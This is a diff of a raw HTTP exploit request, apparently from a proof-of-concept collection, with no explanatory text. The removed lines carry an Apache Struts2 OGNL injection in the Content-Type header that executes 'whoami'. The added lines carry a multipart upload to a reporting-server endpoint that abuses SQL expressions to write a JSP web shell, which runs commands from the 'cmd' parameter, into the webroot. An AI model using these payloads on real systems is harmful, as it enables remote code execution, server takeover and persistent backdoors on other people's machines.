@@ -1,6 +1,15 @@
-POST /admin/login_login.action HTTP/1.1
-Host: 127.0.0.1
-Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
-Accept-Encoding: gzip
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
-Content-Length: 0
+POST /webroot/decision/view/form?op=fr_attach&cmd=aH_upload HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9nWtz5kBq3EiN5Jp
+Connection: close
+
+------WebKitFormBoundary9nWtz5kBq3EiN5Jp
+Content-Disposition: form-data; name="file"; filename="a"
+Content-Type: text/xml
+
+${SQL("FRDemo","	ATTACH DATABASE '../webapps/webroot/ctc.jsp' as psox;",1,1)}
+${SQL("FRDemo","	CREATE TABLE psox.exp(data text);",1,1)}
+${SQL("FRDemo","	INSERT INTO psox.exp(data) VALUES ('<%out.println(\"hallo\");Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>');",1,1)}
+------WebKitFormBoundary9nWtz5kBq3EiN5Jp--
